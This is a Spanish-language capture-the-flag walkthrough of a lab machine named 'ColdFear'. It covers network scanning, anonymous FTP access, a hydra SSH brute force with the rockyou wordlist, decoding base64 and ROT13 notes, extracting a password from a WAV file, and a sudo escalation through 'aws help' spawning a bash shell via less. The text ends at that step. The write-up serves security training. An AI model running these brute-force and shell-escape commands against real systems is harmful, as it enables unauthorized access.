# Reconocimiento
En primer lugar, se identifica la IP de la máquina.

```zsh
sudo netdiscover
...
192.168.1.157   08:00:27:3c:4f:ef      1      60  PCS Systemtechnik GmbH
...
```

Se escanean los puertos de la máquina con **nmap**, para identificar puntos vulnerables e intentar ampliar la superficie de ataque, el escáner revela un servidor FTP que permite login anónimo, un servidor SSH y un servidor HTTP, todos en sus puertos default.

```zsh
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.3  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:192.168.1.145  
|      Logged in as ftp  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 1  
|      vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_-r--r--r--    1 0        0            1033 Dec 09 23:31 bitacora-01.txt  
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)  
| ssh-hostkey:    
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)  
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)  
80/tcp open  http    Apache httpd 2.4.65 ((Debian))  
| http-methods:    
|_  Supported Methods: GET POST OPTIONS HEAD  
|_http-server-header: Apache/2.4.65 (Debian)  
|_http-title: Apache2 Debian Default Page: It works
```



# Explotación
Lo más sencillo para comenzar, ya que permite login anónimo, es ver que hay en el servidor FTP, por lo que entramos y descargamos su contenido.

```zsh
ftp 192.168.1.157    
Connected to 192.168.1.157.  
220 (vsFTPd 3.0.3)  
Name (192.168.1.157:kali): anonymous  
230 Login successful.  
...
ftp> ls  
...
-r--r--r--    1 0        0            1033 Dec 09 23:31 bitacora-01.txt  
226 Directory send OK.  
ftp> get bitacora-01.txt  
local: bitacora-01.txt remote: bitacora-01.txt  
...
226 Transfer complete.  
1033 bytes received in 00:00 (59.31 KiB/s)  
ftp> exit  
221 Goodbye.
```

El contenido de la nota es el siguiente, contiene un nombre que quizá podría servir para atacar por fuerza bruta el servidor SSH.

```
──────────────────────────────────────────────  
BITÁCORA DEL TRIPULANTE 7 — DÍA NO REGISTRADO  
──────────────────────────────────────────────  
  
El viento golpea el casco como si quisiera entrar.  
La luz de emergencia parpadea... no debería parpadear.  
Los niveles inferiores siguen inundados, pero alguien  
—o algo— ha estado moviendo herramientas allá abajo.  
  
Los ruidos metálicos ya no parecen casuales.  
Anoche escuché pasos en la cubierta vacía.  
Y esta madrugada... susurros.  
  
No he dormido en dos días.  
  
No confío en nadie más en la tripulación.  
Si alguien encuentra este registro, que sepa que  
algo está avanzando por los pasillos. No sé qué es,  
pero no está solo.  
  
Firmado:  
 tripulanteX  
──────────────────────────────────────────────
```


## Fuerza bruta
Mientras iba analizando otras posibles vías deje un ataque de fuerza de bruta corriendo, y al cabo de un par de minutos dió resultado.

```zsh
hydra -f -I -l tripulanteX -P /usr/share/wordlists/rockyou.txt -s 22 -t 64 ssh://192.168.1.157

...
[22][ssh] host: 192.168.1.157   login: tripulanteX   password: candy1
...
```



# Escalada
Al acceder a la máquina vía SSH, se nos recibe con una nota, en cualquier caso, lo primero siempre es sanitizar la shell:

```zsh
ssh tripulanteX@192.168.1.157  
==========================================  
     SISTEMA DE ACCESO — COLD FEAR  
==========================================  
  
Advertencia del sistema:  
El último registro indica que varios miembros  
de la tripulación desaparecieron durante el fallo  
del generador secundario. Las puertas automáticas  
no responden. El ruido metálico parece aumentar  
con cada ciclo de ventilación.  
  
* Si estás leyendo esto… no estás solo aquí.  
* Evita los corredores inferiores del casco.  
* Y no confíes en las transmisiones internas.  
  
— Registro automático del sistema ORCA-Deep  
tripulanteX@192.168.1.157s password: ## candy1    
...
tripulanteX@ColdFear:~$ export TERM=xterm-256color && source /etc/skel/.bashrc
```

En la carpeta principal del usuario, hay dos imágenes y una nota, después de leerla paso las imágenes a mi máquina para poder analizarlas.

```zsh
tripulanteX@debian:~$ ls  
bitacora-puente.log  bridge-cam.jpg  bridge-cam.jpg_original  
tripulanteX@debian:~$ cat bitacora-puente.log    
[REPORTE DEL PUENTE – 23:40]  
  
Se detectó actividad anómala en las cámaras del puente.    
El sistema registró múltiples interferencias justo antes de que la tripulación    
reportara ruidos extraños en el pasillo principal.  
  
He respaldado una de las imágenes capturadas por la cámara del puente.    
No confío en el sistema, así que decidí dejar una copia aquí.  
  
IMPORTANTE:     
Revisar cuidadosamente cada detalle visual.    
A veces lo que no se ve a simple vista está registrado en los metadatos    
o escondido entre los patrones del archivo.  
  
— Tripulante X  
tripulanteX@debian:~$ scp bridge* kali@192.168.1.145:/home/kali/ColdFear
```

Visualmente las imágenes son idénticas, sin embargo, al examinar la modificada con una herramienta como Exiftool (para ver metadatos), vemos que contiene información.

```zsh
======== bridge-cam.jpg  
...
Artist                          : Las sombras se mueven cuando nadie mira. Busca el acceso en /var/log/bridge/.  
...
```

Allí hay una nota que dice lo siguiente:

```zsh
tripulanteX@debian:/var/log/bridge$ ls  
bridge-report-02.log  
tripulanteX@debian:/var/log/bridge$ cat bridge-report-02.log    
[BRIDGE LOG – 23:55]  
  
Alguien está accediendo a los sistemas de navegación sin autorización.  
Los registros muestran intentos de ingreso desde una cuenta que no debería    
estar activa a estas horas.  
  
Usuario involucrado: boris  
  
El sistema bloqueó el acceso, pero parece que la contraseña fue cambiada    
manualmente durante el turno anterior. Sospecho que el intruso dejó comentarios    
en los archivos de configuración del propio usuario.  
  
Revisar el directorio de boris para buscar actividad.  
  
— Oficial de Guardia, Puente de Mando
```

Allí encontramos más notas

```zsh
tripulanteX@debian:/home/boris$ ls  
bitacora.txt  logs  
tripulanteX@debian:/home/boris$ cat bitacora.txt    
[LOG PERSONAL – BORIS]  
  
Si alguien llega a leer esto… revisen mis logs.  
Intenté dejar todo protegido, pero tuve que recurrir a un método casero:  
doble cifrado.  
  
Es mejor que revisen los archivos dentro de /home/boris/logs/  
Ahí dejé lo necesario.  
  
tripulanteX@debian:/home/boris$ cd logs/  
tripulanteX@debian:/home/boris/logs$ ls  
bitacora-boris.txt  shifted-report.enc  
tripulanteX@debian:/home/boris/logs$ cat bitacora-boris.txt    
[Registro Interno – Oficial Boris Malyuk]  
Fecha: 12 de diciembre, 02:46 AM  
  
Algo está ocurriendo con el sistema de cámaras del puente.     
Las imágenes se congelan, cambian de ángulos por sí solas o muestran siluetas que no deberían estar allí.  
  
El ingeniero Sergei dijo que revisaría los controladores esta noche.     
Si alguien necesita verificar su trabajo, él guarda todos sus apuntes técnicos en su cuenta personal.    
Siempre ha sido cuidadoso con sus contraseñas, así que espero que no haya vuelto a “ofuscar” sus mensajes como la otra vez.  
  
Si la situación empeora, será responsabilidad de Sergei explicar por qué los registros del sistema fallan justo cuando más los necesitamos.  
  
– Boris.  
tripulanteX@debian:/home/boris/logs$ cat shifted-report.enc    
UnkgbnBwcmZiIG55IGZ2Zmdyem4gZnIgaWJ5aXbzIHZhcmZnbm95ci4KUXJvYiBjZWJncnRyZSB6diBwYmFnZW5mcvFuLiAgClluIHFyd+kgcHZzZW5xbiBoZm5hcWIgaGEgcWJveXIgeu  
lnYnFiOgpDZXZ6cmViIEVCRzEzIGwgeWhydGIgT25mcjY0LgoKUHluaXI6IHNlYmFyZW5lcmc=
```

En cuanto a ese último string, claramente es un tipo de cifrado o código, pruebo a pasarlo por un un decodificador base64 y deja como resultando un texto que tiene toda la pinta de ser un cifrado césar, y, efectivamente, al descifrarlo con el método césar desplazando 13 posiciones recupero el texto original.

```
Ry npprfb ny fvfgrzn fr ibyiv varfgnoyr.
Qrob cebgrtre zv pbagenfrn.  
Yn qrw pvsenqn hfnaqb ha qboyr zgbqb:
Cevzreb EBG13 l yhrtb Onfr64.

Pynir: sebarenerg

-----------------------------------------------
	Descifrado césar desplazando 13 posiciones
-----------------------------------------------

El acceso al sistema se volvi inestable.
Debo proteger mi contrasea.  
La dej cifrada usando un doble mtodo:
Primero ROT13 y luego Base64.

Clave: froneraret
```


## Sergei

Con esa clave consigo acceder a la cuenta de *sergei*, con la que busco en su directorio en busca de pistas.

```zsh
sergei@debian:~$ cat bitacora.txt    
Bitácora de Sergei – Última transmisión  
  
Victor…  
  
No sé cuánto tiempo más aguantaré. El frío está calando hasta los huesos y la interferencia en la radio es cada vez peor.    
Logré grabar unos mensajes antes de que la tormenta golpeara con más fuerza. Los dejé en la carpeta 'audios'.  
  
Los archivos 'sergei_radio_fixed.wav', 'sergei_pass_fixed.wav'. Escúchalos con atención… llevan lo que necesitas para continuar.    
Pero hazlo con cuidado. Si este mensaje cae en manos equivocadas… ya sabes lo que podría pasar.  
  
La señal se está debilitando.  
  
— Sergei  
sergei@debian:~$ ls  
audios  bitacora.txt  bridge  cam  
sergei@debian:~$ cd audios/  
sergei@debian:~/audios$ ls  
sergei_pass_hidden.wav  sergei_radio_fixed.wav  
sergei@debian:~/audios$ scp *.wav kali@192.168.1.145:/home/kali/ColdFear  
kali@192.168.1.145's password:    
sergei_pass_hidden.wav                                                                                      100%  582KB  41.6MB/s   00:00       
sergei_radio_fixed.wav
```

Trasteando con los archivos y buscando formas de ocultar información en archivos .wav, se da con la herramienta `stegowav`, que se utiliza para extraer la información oculta del archivo.

```zsh
python3 stegowav.py sergei_pass_hiden.wav -d
```

```
victor:blackcrow
```

Con esto tenemos la clave para el usuario *victor*, al cual se mencionaba en el otro audio.

## Victor

Como Victor no duramos mucho, se puede ejecutar `aws` como *anna*. El comando `aws help` utiliza el binario `less` para exponer la información, y podemos utilizar `less` para escalar abriendo una shell de bash con los privilegios de *anna*.

```zsh
victor@debian:~$ sudo -l  
Matching Defaults entries for victor on debian:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User victor may run the following commands on debian:  
   (anna) NOPASSWD: /usr/bin/aws  
victor@debian:~$ sudo -u anna aws help ## !/bin/bash dentro de help
```

